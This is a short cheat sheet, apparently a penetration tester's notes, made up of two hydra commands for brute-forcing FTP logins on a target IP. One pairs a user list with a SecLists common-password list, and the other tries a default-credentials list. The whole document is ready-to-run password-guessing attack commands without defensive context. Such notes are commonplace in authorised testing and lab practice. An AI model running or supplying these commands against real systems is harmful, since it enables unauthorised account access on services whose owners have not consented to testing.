# hydra bruteforce ftp
```
hydra -L users -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -e nsr $IP ftp
```

# hydra bruteforce ftp default creds
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP ftp
```
